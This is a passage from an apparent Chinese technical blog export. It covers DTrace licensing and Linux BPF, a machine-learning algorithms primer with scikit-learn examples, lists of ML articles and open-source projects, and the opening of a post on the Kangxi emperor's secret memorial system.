协议授予了被许可人（几乎是任何人）以非常广泛的自由，同时利用版权法设计了“传染机制”：GPL明确规定，任何源码的衍生产品，如果对外发布，都必须保持同样的许可证。这就是说，任何人只要发布基于某个GPL软件的修改版本，他就必须公开源码，并且同意他人可以自由地复制和分发，否则原始作者可以根据版权法起诉 。 DTrace 的 CDDL 许可证继承自 Sun Microsystems 。通用开发与发行许可证（Common Development and Distribution License，简称CDDL） 是一个由 Sun 提出的授权协议，它以 Mozilla 公共许可证（MPL）1.1版本为基础。基于 CDDL 许可证的项目主要有：OpenSolaris (含 DTrace 和 ZFS) 、NetBeans IDE 、GlassFish 等。 Like the MPL, the CDDL is a weak copyleft license in-between GPL license and BSD/MIT permissive licenses, requiring only source code files under CDDL to remain under CDDL. 鉴于 GPL 许可模式下很难通过开源软件直接盈利，因此也有很多类似 CDDL 的开源协议倾向于支持商业开发，授予厂商更大的决定权。CDDL 最大的特点是源代码和可执行文件允许采用不同的许可证。例如一般不存在 GPL 模式下存在的 “社区”版本，而是由厂商提供一些免费版本供开发者在非生产环境下使用，同时附上 CDDL 许可的源代码，开发者可以自行编译和部署；更重要的是，厂商只对付费客户提供安全补丁修复和维护版本的源代码。 综上所述，基于 CDDL 许可证的 DTrace 你只可以使用但不允许围绕代码进行修改，或者添加其他跟踪点。Paul Fox 个人贡献的dtrace4linux 项目就试图移植 Sun DTrace 到 Linux 的 ，但是受限于许可证只能做到附加产品（add-on）, 外部人员很难直接参与进来，事实上 CDDL 许可证的项目外部贡献最多一般不会超过 10% 。 Future在此之前，Linux 已经拥有 SystemTap 和动态探针（dprobes），DTrace 是基于整个系统的全局跟踪、调试、分析工具。Linux kernel 的创建者显然不喜欢一个“复杂”的系统（large system）, 他们倾向于将跟踪、分析和探测划分为彼此独立的小单元。许多开发者为此发明了各种钩子（hooks）以及整合某些特定探针（probes）的便利工具，例如 kprobes , uprobes, markers 等。 dtrace for linux 正式进入 Linux kernel 之后，有望将相关技术整合成一个更强大的体系，这一点非常令人期待。 里程碑：Linux 合并 BPF2016年11月，Linux 4.9-rc1发布，正式合并了一项重要特性：BPF追踪（Timed sampling）。 系统性能领域的国际导师Brendan Gregg，感动得都快哭了，当即在Twitter上表示这是一个重要的里程碑!他随后又写了一篇长文《DTrace for Linux 2016》，以示庆祝。 As a long time DTrace user and expert, this is an exciting milestone!–Brendan Gregg Linux 合并了BPF而已嘛，跟DTrace这个劳什子有什么关系呢？ DTrace 是动态追踪技术的鼻祖，源自 Solaris 操作系统，提供了高级性能分析和调试功能，它的源代码采用 CDDL 许可证，不兼容 Linux 内核使用的 GPLv2 许可证，无法直接移植。当然，江湖上还有另外一种说法，Linux之所以一直没有原生支持DTrace,是因为Linus 觉得这玩意没什么必要。Anyway,随着 BPF跟踪的最后主要功能合并到 Linux 4.9-rc1，Linux 现在有了类似 DTrace 的高级分析和调试功能。 Linux 这次合并的BPF（The Berkeley Packet Filter ），来自于加州大学伯克利分校（这所大学很有意思，以后还要反复提到）。BPF，顾名思义，最早只是一个纯粹的封包过滤器，后来在很多牛人的参与下，进行了扩展，得到了一个所谓的 eBPF，可以作为某种更加通用的内核虚拟机。通过这种机制，我们其实可以在 Linux 中构建类似 DTrace 那种常驻内核的动态追踪虚拟机。 Linux 没有 DTrace（名字），但现在有了 DTrace（功能） 扩展阅读：动态追踪技术 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 DTRACE FOR LINUX; ORACLE DOES THE RIGHT THING | February 14, 2018 | MARK J. WIELAARD Oracle Linux DTrace]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:机器学习技术与知识产权法]]></title>
    <url>%2F2018%2F02%2F16%2FMachine-Learning-Law%2F</url>
    <content type="text"><![CDATA[摘要 判例 上海智臻智能网络科技股份有限公司、苹果电脑贸易（上海）有限公司与国家知识产权局专利复审委员会再审行政裁定书 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 专利制度会阻碍科技进步吗？就 AI 领域而言，这一趋势愈加明显 基于深度学习对医疗数据进行分析的方法及其智能分析仪 一种基于机器学习的在线管网异常侦测系统 基于机器学习的专利数据处理方法及其处理系统 人工智能与法律问题初探 | 2017年11月29日 作者: 蔡雄山]]></content>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:机器学习算法]]></title>
    <url>%2F2018%2F02%2F10%2FMachine-Learning-Algorithms%2F</url>
    <content type="text"><![CDATA[摘要 机器学习算法分类：监督学习、半监督学习、无监督学习、强化学习 基本的机器学习算法：线性回归、支持向量机(SVM)、最近邻居(KNN)、逻辑回归、决策树、k平均、随机森林、朴素贝叶斯、降维、梯度增强 公式、图示、案例 机器学习算法分类机器学习算法大致可以分为： 监督学习 | Supervised learning 半监督学习 | Semi-supervised learning 无监督学习 | Unsupervised learning 强化学习 | Reinforcement learning 监督学习 | Supervised learning监督学习算法基于一组示例进行预测。在监督学习训练过程中，可以由训练数据集学到或建立一个模式（函数 / learning model），并依此模式推测新的实例。 监督学习算法要求特定的输入/输出，一个常见的例子是根据当年和前几年的销售情况估算下一年的销售额。首先需要决定 使用哪种数据作为范例。例如，文字识别应用中一个手写的字符，或一行手写文字。监督学习主要算法包括神经网络、支持向量机、最近邻居法、朴素贝叶斯法、决策树等。 分类（Classification）：当数据被用于预测分类变量时，监督学习也被称为分类。为图像分配标签或指示器（例如狗或猫）时就是这种情况。当只有两个标签时，这称为二进制分类（ binary classification）。当有两个以上的类别时，这些问题被称为多级分类（multi-class classification）。 回归（Regression）：当我们需要预测连续值时，就变成了回归问题。 预测（Forecasting）：根据过去和现在的数据对未来进行预测的过程。它最常用于分析趋势。 半监督学习 | Semi-supervised learning监督学习带来的挑战是标签数据可能非常昂贵而且耗时。如果标签有限，可以使用未标记的示例来增强监督式学习。因为在这种情况下机器没有完全监督，所以我们说机器是半监督的。使用半监督学习，您可以使用带有少量标签数据的未标记示例来提高学习的准确性。 无监督学习 | Unsupervised learning无监督学习算法没有特定的目标输出，算法将数据集分为不同的组。 在进行无监督学习时，机器会显示完全未标记的数据。它要求发现数据基础的内在模式，例如聚类结构（clustering structure），低维流形（a low-dimensional manifold）或稀疏树（sparse tree ）和图（graph）。 聚类（Clustering）：对一组数据示例进行分组，使一个组（或一个聚类）中的示例与其他组中的示例更相似（根据某些标准）。这通常用于将整个数据集分成几个组。可以在每个组中进行分析以帮助用户找到固有模式。 降维（Dimension reduction）：减少需要考虑的变量数量。在许多应用中，原始数据具有非常高的维度特征，并且一些特征对于任务是多余的或不相关的。降维有助于找到数据内在真实的、潜在的关系。 强化学习 | Reinforcement learning强化学习强调通过基于环境的反馈行为分析、优化以取得最佳预期。机器尝试不同的场景来发现哪些行为能产生最大的回报，而不是被告知要采取何种行动。反复试验（Trial-and-error）和延迟奖励（delayed reward）是将强化学习与其他技术区分开来的关键。 强化学习普适性强，主要基于决策进行训练，算法根据输出结果（决策）的成功或错误来训练自己，通过大量经验训练优化后的算法将能够给出较好的预测。类似有机体在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。在运筹学和控制论的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。 机器学习算法列表 线性回归算法 Linear Regression 支持向量机算法 (Support Vector Machine,SVM) 最近邻居/k-近邻算法 (K-Nearest Neighbors,KNN) 逻辑回归算法 Logistic Regression 决策树算法 Decision Tree k-平均算法 K-Means 随机森林算法 Random Forest 朴素贝叶斯算法 Naive Bayes 降维算法 Dimensional Reduction 梯度增强算法 Gradient Boosting 1. 线性回归算法 Linear Regression回归分析（Regression Analysis）是统计学的数据分析方法，目的在于了解两个或多个变量间是否相关、相关方向与强度，并建立数学模型以便观察特定变量来预测其它变量的变化情况。 线性回归算法（Linear Regression）的建模过程就是使用数据点来寻找最佳拟合线。公式，y = mx + c，其中 y 是因变量，x 是自变量，利用给定的数据集求 m 和 c 的值。线性回归又分为两种类型，即 简单线性回归（simple linear regression)，只有 1 个自变量；*多变量回归（multiple regression)，至少两组以上自变量。 下面是一个线性回归示例：基于 Python scikit-learn 工具包描述。 123456789101112131415161718from sklearn import linear_model, datasets#digit dataset from sklearndigits = datasets.load_digits()#create the LinearRegression modelclf = linear_model.LinearRegression()#set training setx, y = digits.data[:-1], digits.target[:-1]#train modelclf.fit(x, y)#predicty_pred = clf.predict([digits.data[-1]])y_true = digits.target[-1]print(y_pred)print(y_true) 2. 支持向量机算法(Support Vector Machine,SVM)支持向量机/网络算法(SVM)属于分类型算法。SVM模型将实例表示为空间中的点，将使用一条直线分隔数据点。需要注意的是，支持向量机需要对输入数据进行完全标记，仅直接适用于两类任务，应用将多类任务需要减少到几个二元问题。 1234567891011121314151617181920from sklearn import svm, datasets#digit dataset from sklearndigits = datasets.load_digits()#create the Support Vector Classifierclf = svm.SVC(gamma = 0.001, C = 100)#set training setx, y = digits.data[:-1], digits.target[:-1]#train modelclf.fit(x, y)#predicty_pred = clf.predict([digits.data[-1]])y_true = digits.target[-1]print(y_pred)print(y_true) 3. 最近邻居/k-近邻算法 (K-Nearest Neighbors,KNN)KNN算法是一种基于实例的学习，或者是局部近似和将所有计算推迟到分类之后的惰性学习。用最近的邻居（k）来预测未知数据点。k 值是预测精度的一个关键因素，无论是分类还是回归，衡量邻居的权重都非常有用，较近邻居的权重比较远邻居的权重大。 KNN 算法的缺点是对数据的局部结构非常敏感。计算量大，需要对数据进行规范化处理，使每个数据点都在相同的范围。 12345678910111213141516171819202122from sklearn import datasetsfrom sklearn.neighbors import KNeighborsClassifier#digit dataset from sklearndigits = datasets.load_digits()#create the KNeighborsClassifierclf = KNeighborsClassifier(n_neighbors=6)#set training setx, y = digits.data[:-1], digits.target[:-1]#train modelclf.fit(x, y)#predicty_pred = clf.predict([digits.data[-1]])y_true = digits.target[-1]print(y_pred)print(y_true) 延伸：KNN 的一个缺点是依赖于整个训练数据集，学习向量量化（Learning Vector Quantization，LVQ)是一种监督学习的人神经网络算法，允许你选择训练实例。LVQ 由数据驱动，搜索距离它最近的两个神经元，对于同类神经元采取拉拢，异类神经元采取排斥，最终得到数据的分布模式。如果基于 KNN 可以获得较好的数据集分类效果，利用 LVQ 可以减少存储训练数据集存储规模。典型的学习矢量量化算法有LVQ1、LVQ2和LVQ3，尤以LVQ2的应用最为广泛。 4. 逻辑回归算法 Logistic Regression逻辑回归算法（Logistic Regression）一般用于需要明确输出的场景，如某些事件的发生（预测是否会发生降雨）。通常，逻辑回归使用某种函数将概率值压缩到某一特定范围。例如，Sigmoid 函数（S 函数）是一种具有 S 形曲线、用于二元分类的函数。它将发生某事件的概率值转换为 0, 1 的范围表示。 Y = E ^（b0＋b1 x）/（1 + E ^（b0＋b1 x ）） 以上是一个简单的逻辑回归方程，B0，B1是常数。这些常数值将被计算获得，以确保预测值和实际值之间的误差最小。 5. 决策树算法 Decision Tree决策树（Decision tree）是一种特殊的树结构，由一个决策图和可能的结果（例如成本和风险）组成，用来辅助决策。机器学习中，决策树是一个预测模型，树中每个节点表示某个对象，而每个分叉路径则代表某个可能的属性值，而每个叶节点则对应从根节点到该叶节点所经历的路径所表示的对象的值。决策树仅有单一输出，通常该算法用于解决分类问题。 一个决策树包含三种类型的节点： 决策节点：通常用矩形框来表示 机会节点：通常用圆圈来表示 终结点：通常用三角形来表示 简单决策树算法案例，确定人群中谁喜欢使用信用卡。考虑人群的年龄和婚姻状况，如果年龄在30岁或是已婚，人们更倾向于选择信用卡，反之则更少。通过确定合适的属性来定义更多的类别，可以进一步扩展此决策树。在这个例子中，如果一个人结婚了，他超过30岁，他们更有可能拥有信用卡（100% 偏好）。测试数据用于生成决策树。 注意：对于那些各类别样本数量不一致的数据，在决策树当中信息增益的结果偏向于那些具有更多数值的特征。 6. k-平均算法 K-Meansk-平均算法(K-Means)是一种无监督学习算法，为聚类问题提供了一种解决方案。K-Means 算法把 n 个点（可以是样本的一次观察或一个实例）划分到 k 个集群（cluster），使得每个点都属于离他最近的均值（即聚类中心，centroid）对应的集群。重复上述过程一直持续到重心不改变。 7. 随机森林算法 Random Forest随机森林算法（Random Forest）的名称由 1995 年由贝尔实验室提出的random decision forests 而来，正如它的名字所说的那样，随机森林可以看作一个决策树的集合。随机森林中每棵决策树估计一个分类，这个过程称为“投票（vote）”。理想情况下，我们根据每棵决策树的每个投票，选择最多投票的分类。 PaperRandom Forest |Leo Breiman | Statistics Department University of California Berkeley 8. 朴素贝叶斯算法 Naive Bayes朴素贝叶斯算法（Naive Bayes）基于概率论的贝叶斯定理，应用非常广泛，从文本分类、垃圾邮件过滤器、医疗诊断等等。朴素贝叶斯适用于特征之间的相互独立的场景，例如利用花瓣的长度和宽度来预测花的类型。“朴素”的内涵可以理解为特征和特征之间独立性强。 与朴素贝叶斯算法密切相关的一个概念是最大似然估计(Maximum likelihood estimation)，历史上大部分的最大似然估计理论也都是在贝叶斯统计中得到大发展。例如，建立人口身高模型，很难有人力与物力去统计全国每个人的身高，但是可以通过采样，获取部分人的身高，然后通过最大似然估计来获取分布的均值与方差。 Naive Bayes is called naive because it assumes that each input variable is independent. 9. 降维算法 Dimensional Reduction在机器学习和统计学领域，降维是指在限定条件下，降低随机变量个数，得到一组“不相关”主变量的过程，并可进一步细分为特征选择和特征提取两大方法。 一些数据集可能包含许多难以处理的变量。特别是资源丰富的情况下，系统中的数据将非常详细。在这种情况下，数据集可能包含数千个变量，其中大多数变量也可能是不必要的。在这种情况下，几乎不可能确定对我们的预测影响最大的变量。此时，我们需要使用降维算法，降维的过程中也可能需要用到其他算法，例如借用随机森林，决策树来识别最重要的变量。 10. 梯度增强算法 Gradient Boosting梯度增强算法（Gradient Boosting）使用多个弱算法来创建更强大的精确算法。它与使用单个估计量不同，而是使用多个估计量创建一个更稳定和更健壮的算法。梯度增强算法有几种： XGBoost — 使用线性和树算法 LightGBM — 只使用基于树的算法梯度增强算法的特点是精度较高。此外，LightGBM 算法具有令人难以置信的高性能。 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 媒体报道|经济学人：What are algorithms? A Tour of The Top 10 Algorithms for Machine Learning Newbies 维基百科：监督学习 AI工程师基础能力：机器学习 | InfoQ Reinforcement Learning 强化学习 Python 3 教你看懂各种神经网络 神经网络架构 微软Azure算法图表 SAS算法图表 算法总结http://thinkbigdata.in/best-known-machine-learning-algorithms-infographic/) 算法的优劣对比]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:机器学习参考文集]]></title>
    <url>%2F2018%2F02%2F09%2FMachine-Learning-Articles%2F</url>
    <content type="text"><![CDATA[摘要 机器学习参考文集 Machine Learning 资讯 | 基于深度学习识别姑息治疗患者 Machine Learning Top Articles “Hiring a Machine Learning engineer or Data Scientist in Silicon Valley is becoming like hiring a professional athlete. That’s how demanding it is” — The New York Times Popular Ai Articles: A noob’s guide to implementing RNN-LSTM using Tensorflow Keras Cheat Sheet: Neural Networks in Python Making a Simple Neural Network Machine Learning Top Articles Learn to Build a Machine Learning Application from Top Articles of 2017 Paper TensorFlow:Large-Scale Machine Learning on Heterogeneous Distributed Systems (Preliminary White Paper, November 9, 2015) 分类 图像处理 Image Manipulation 风格转换 Style Transfer 图像分类 Image Classification 脸部识别 Face Recognition 视频稳定化 Video Stabilization 目标检测 Object Detection 自动驾驶汽车 Self Driving Car 智能推荐 Recommendation Al 智能游戏 Gaming Al 智能下棋 Chess Al 智能医学 Medical Al 智能演说 Speech Al 智能音乐 Music Al 自然语言处理 Natural Language Processing 智能预测 Prediction Mybridge AI 在 20000 篇关于创建机器学习应用的文章中挑选了前 50 名。从有实践经验的数据科学家那里学习是一个好方法，我们可以的分享中获得构建、运营机器学习应用的经验教训。50 篇文章大致可以分为 15 个主题，如下所示： Recommended Learning The Beginner’s Guide to Building an Artificial Intelligence in Unity. Deep Learning and Computer Vision A-Z™: Learn OpenCV, SSD &amp; GANs and create image recognition apps. 图像处理 Image Manipulation High-Resolution Image Synthesis and Semantic Manipulation with Conditional GANs Using Deep Learning to Create Professional-Level Photographs High Dynamic Range (HDR) Imaging using OpenCV (Python) 风格转换 Style Transfer Visual Attribute Transfer through Deep Image Analogy Deep Photo Style Transfer: A deep-learning approach to photographic style transfer that handles a large variety of image content while faithfully transferring the reference style Deep Image Prior 图像分类 Image Classification Feature Visualization: How neural networks build up their understanding of images An absolute beginner’s guide to Image Classification with Neural Networks Background removal with deep learning 人脸识别 Face Recognition Large Pose 3D Face Reconstruction from a Single Image via Direct Volumetric CNN Regression Eye blink detection with OpenCV, Python, and dlib DEAL WITH IT in Python with Face Detection 视频稳定化 Video Stabilization Fused Video Stabilization on the Pixel 2 and Pixel 2 XL 目标检测 Object Detection How HBO’s Silicon Valley built “Not Hotdog” with mobile TensorFlow, Keras &amp; React Native Object detection: an overview in the age of Deep Learning How to train your own Object Detector with TensorFlow’s Object Detector API Real-time object detection with deep learning and OpenCV 自动驾驶汽车 Self Driving Car Self-driving Grand Theft Auto V with Python : Intro [Part I] - Sentdex Recognizing Traffic Lights With Deep Learning: How I learned deep learning in 10 weeks and won $5,000 智能推荐 Recommendation AI Spotify’s Discover Weekly: How machine learning finds your new music Artwork Personalization at Netflix 智能游戏 Gaming AI MariFlow - Self-Driving Mario Kart w/Recurrent Neural Network OpenAI Baselines: DQN. Reproduce reinforcement learning algorithms with performance on par with published results. Reinforcement Learning on Dota 2 [Part II] Creating an AI DOOM bot Phase-Functioned Neural Networks for Character Control The Game Imitation: Deep Supervised Convolutional Networks for Quick Video Game AI - Stanford University Introducing: Unity Machine Learning Agents – Unity Blog 智能下棋 Chess AI Mastering Chess and Shogi by Self-Play with a General Reinforcement Learning Algorithm AlphaGo Zero: Learning from scratch | DeepMind How Does DeepMind’s AlphaGo Zero Work? A step-by-step guide to building a simple chess AI 智能医学 Medical AI CheXNet: Radiologist-Level Pneumonia Detection on Chest X-Rays with Deep Learning Can you improve lung cancer detection? 2nd place solution for the Data Science Bowl 2017. Improving Palliative Care with Deep Learning - Andrew Ng Heart Disease Diagnosis with Deep Learning 基于深度学习识别姑息治疗患者Stanford ML Group 建立了一个使用深度学习算法的程序，根据电子健康记录（Electronic Health Record ，EHR，包括病历、心电图、医疗影像等信息）数据确定在未来3-12个月高风险死亡的住院患者。这些病人的预警信息将发送给姑息治疗小组，这有助于姑息护理小组尽早介入、提供服务。 姑息治疗（Palliative Care ，在日本、中国台湾翻译为舒缓医学）起源于 hospice运动，最早起源于公元四世纪。根据世界卫生组织的定义，姑息治疗强调控制疼痛及患者有关症状，并对心理、社会和精神问题予以重视，目的是为病人和家属赢得最好的生活质量。 预测模型是一个 18 层的深度神经网络，输入参数为一个病人的 EHR 数据，输出为未来 3-12 个月死亡的概率。训练数据采用斯坦福医院 EHR 数据库中的历史数据，包含超过 200 万名患者的数据。EHR 数据包括患者过去 12 个月的诊断结论、治疗程序、处方和相关细节（经过脱敏和技术处理，以替代码的形式表示），所有数据被转换成 13654 维的特征向量。训练好的模型 AUROC 评分达到 0.93 ，交叉验证的平均精度为0.69 分。 对于机器学习系统来说，使用户可以根据预测结果采取行动，需要提供预测结果的详细解释，这点对于建立用户信心至关重要。Stanford 的程序可以自动生成一个报告，在病人的 EHR 数据中高亮突出对于预测结果具有重要影响因子的条目。 智能演说 Speech AI Tacotron: A Fully End-to-End Text-To-Speech Synthesis Model - Data Scientists at Google Sequence Modeling with CTC Deep Voice: Real-time Neural Text-to-Speech - Baidu Silicon Valley AI Lab Deep Learning for Siri’s Voice: On-device Deep Mixture Density Networks for Hybrid Unit Selection Synthesis - Apple 智能音乐 Music AI Computer evolves to generate baroque music! Make your own music with WaveNets: Making a Neural Synthesizer Instrument 自然语言处理 Natural Language Processing Learning to communicate: Agents developing their own language - OpenAI Research Big Picture Machine Learning: Classifying Text with Neural Networks and TensorFlow A novel approach to neural machine translation - Facebook AI Research How to make a racist AI without really trying 预测 Prediction Using Machine Learning to Predict Value of Homes On Airbnb Engineering Uncertainty Estimation in Neural Networks for Time Series Prediction at Uber Using Machine Learning to make parking easier How to Predict Stock Prices Easily - Intro to Deep Learning #7 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:机器学习开源项目]]></title>
    <url>%2F2018%2F02%2F09%2FMachine-Learning-Projects%2F</url>
    <content type="text"><![CDATA[摘要 来源：30 Amazing Machine Learning Projects for the Past Year (v.2018) 评选：Mybridge AI 数据：从 8800 个机器学习领域开源项目中选取 Top 30 (0.3%)，Github 平均关注数 3558。 Machine Learning Project CheckList Frame the Problem and Look at the Big Picture Get the Data Explore the Data Prepare the Data Short-List Promising Models Fine-Tune the System Present Your Solution NO.1 FastText [11786 stars]FastText: 文本表示和分类库（representation &amp; classification）贡献者：Facebook Research No.2 Deep-photo-styletransfer [9747 stars]Deep-photo-styletransfer: 论文 “Deep Photo Style Transfer” 的源代码和数据贡献者：Fujun Luan, 康奈尔大学（Cornell University）Ph.D No.3 face_recognition [8672 stars]face_recognition: 脸部识别 API （facial recognition），支持 Python 编程接口贡献者：Adam Geitgey No.4 Magenta [8113 stars]Magenta: 基于机器智能生成音乐和艺术作品 No.5 Sonnet [5731 stars]Sonnet: 基于 TensorFlow 的神经网络库贡献者：Malcolm Reynolds at Deepmind No.6 deeplearn.js [5462 stars]deeplearn.js: 一个面向 Web 的 JavaScript 库，提供硬件加速能力，支持在浏览器中训练神经网络，或者使用已经训练好的模型。贡献者：Nikhil Thorat at Google Brain No.7 fast-style-transfer [4843 stars]fast-style-transfer：基于 TensorFlow，Fast Style Transfer贡献者：Logan Engstrom at MIT No.8 Pysc2 [3683 stars]Pysc2: StarCraft II Learning Environment .贡献者：Timo Ewalds at DeepMind No.9 AirSim [3861 stars]AirSim: 基于 微软（AI &amp; Research）自主驾驶汽车虚拟引擎的开源模拟器贡献者：Shital Shah at Microsoft No.10 Facets [3371 stars]Facets: 机器学习数据集可视化贡献者：Google Brain No.11 Style2Paints [3310 stars]Style2Paints: 图像智能化 No.12 Tensor2Tensor [3087 stars]Tensor2Tensor: 广义顺序序列模型库（sequence to sequence models）贡献者：Ryan Sepassi at Google Brain No.13 pytorch-CycleGAN-and-pix2pix [2847 stars]pytorch-CycleGAN-and-pix2pix：图像翻译 （Image-to-image）， in PyTorch (horse2zebra, edges2cats)贡献者：Jun-Yan Zhu, Ph.D at Berkeley No.14 Faiss [2629 stars]Faiss: 相似性搜索和稠密矢量聚类库 （efficient similarity search &amp; clustering of dense vectors）贡献者：Facebook Research No.15 Fashion-mnist [2780 stars]Fashion-mnist: 类似 MNIST 风格的时尚产品数据库（MNIST：Mixed National Institute of Standards and Technology database)贡献者：Han Xiao, Research Scientist Zalando Tech No.16 ParlAI [2578 stars]ParlAI: 一个基于各种公开可用的对话数据集训练和评估 AI 模型的框架贡献者：Alexander Miller at Facebook Research No.17 Fairseq [2571 stars]Fairseq: 来自 Facebook AI Research 的 Sequence-to-Sequence 工具库 No.18 Pyro [2387 stars]Pyro: 基于 Python 和 Pytorch 的通用深度学习编程接口贡献者：Uber AI Labs No.19 [2369 stars]iGAN: 基于 GAN (生成对抗网络)实现交互式图像生成 No.20 Deep-image-prior [2188 stars]Deep-image-prior: 基于神经网络实现图像修复，非监督学习方式贡献者：Dmitry Ulyanov, Ph.D at Skoltech （斯科尔科沃，俄罗斯“硅谷”） No.21 Face_classification [1967 stars]Face_classification:实时人脸检测与情感/性别识别，使用fer2013/imdb 数据集，基于 Keras CNN 模型和 OpenCV。 No.22 Speech-to-Text-WaveNet [1961 stars]Speech-to-Text-WaveNet : 英语语言识别，基于 DeepMind 的 WaveNet 和 Tensorflow。DeepMind：一家英国人工智能公司。创建于2010年，2014年被谷歌收购。WaveNet is a deep neural network for generating raw audio.贡献者：Namju Kim at Kakao Brain No.23 StarGAN [1954 stars]StarGAN: 用于多域图像到图像转换的统一生成对抗网络贡献者：Yunjey Choi ，高丽大学（ Korea University ） No.24 Ml-agents [1658 stars]Ml-agents: 统一机器学习代理贡献者：Arthur Juliani, Deep Learning at Unity3D No.25 DeepVideoAnalytics [1494 stars]DeepVideoAnalytics: 分布式可视化搜索与数据分析平台贡献者：Akshay Bhat, 康奈尔大学（ Cornell University ）Ph.D No.26 OpenNMT [1490 stars]OpenNMT: 利用 Torch 数学工具包的开源神经机器翻译系统 OpenNMT site Building a Translation System In Minutes | Using OpenNMT-py to create baseline NMT models No.27 Pix2pixHD [1283 stars]Pix2pixHD: 合成和操纵 2048x1024 图像，基于条件式对抗生成网络（Conditional GAN）贡献者：Ming-Yu Liu at AI Research Scientist at Nvidia No.28 Horovod [1188 stars]Horovod: 面向 TensorFlow 的分布式训练框架贡献者：Uber Engineering No.29 AI-Blocks [899 stars]AI-Blocks: 一个强大的图形化机器学习模型编辑器，基于Tensorflow 和 Python。 No.30 deep-voice-conversion [845 stars]deep-voice-conversion: 支持语音转换的深度神经网络（声音风格转换），基于 Tensorflow贡献者：Dabi Ahn, AI Research at Kakao Brain 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 深度学习在IoT大数据和流分析中的应用|InfoQ 腾讯冯牮：基于卷积神经网络在手机端实现文档检测 | 2017-10-03 QCon InfoQ]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[红楼故事：康熙的秘密情报系统]]></title>
    <url>%2F2018%2F02%2F04%2FRedology-Intelligence%2F</url>
    <content type="text"><![CDATA[摘要 一个政府的有效运作取决于对信息流动的仔细掌控。— 孔飞力 曹雪芹的家族出身清廷内务府包衣，并有多人长期担任内务府要职，掌握这一背景是理解红楼梦的重要钥匙。 曹雪芹的曾祖父曹玺历任江宁织造，祖父曹寅历任苏州织造、江宁织造和两淮巡盐御史（江宁织造的任职长达三十年），曹寅姻亲李煦历任畅春园总管、苏州织造、两淮巡盐御史。根据现有资料来看，内务府织造官并不仅仅是负责工程、财税的经济官员，他们更像是康熙皇帝构建的庞大秘密情报系统中的关键成员。 机要信息系统明清时期，王朝制定和完善了一套复杂的信息系统用于上通下达。根据上疏内容的不同，分为题本和奏本。官员上奏公事用题（例如兵马、钱粮、刑名、地方政务等），私事用奏（例如到任、谢恩或代所属官员谢恩，文字不超过三百字）。 清随明制，基本上继承了题本和奏本为基础的本章制度，但是该制度存在几项弊端：第一，保密性差。官员本章首先送到通政司，由该衙门官员负责誊写摘录后报送内阁，内阁大臣票拟贴黄（初步建议）呈皇帝裁定，最后内阁按照皇帝的决定下达命令给六科、部院和地方官员。当然，经通政司转呈的奏本，上奏官员亦可以写上“密奏”两个字，理论上会有较为保密的处理方式。第二，处理效率问题。很难明确区分紧急事务和日常事务。不利于将各种问题在适当的层次上、根据合理的次序解决。第三，报告官员有限。题本只限于高级文武官员使用，如总督、巡抚、八旗驻防将军、及各部院尚书、侍郎。例如江宁织造的正式职衔只是内务府五品郎中。 有鉴于此，康熙在常规渠道之外建立了一套秘密的、非正式制度，用来接收官员奏报并下达指示，即密折制度。 密折制度很可能起源于“请安折”。请安折一般就只有一两行，表示叩谢皇恩，恭祝皇上龙体康泰。但是，皇帝有意识地引导臣下丰富折子的内容，康熙不仅针对密折内容给出具体意见，还反复强调保密性。 王鸿绪密折(朱批)：京中如有可闻之事，卿可密书奏折，与请安封内奏闻，不可令人知道。倘泄漏甚有关系，小心！小心！ 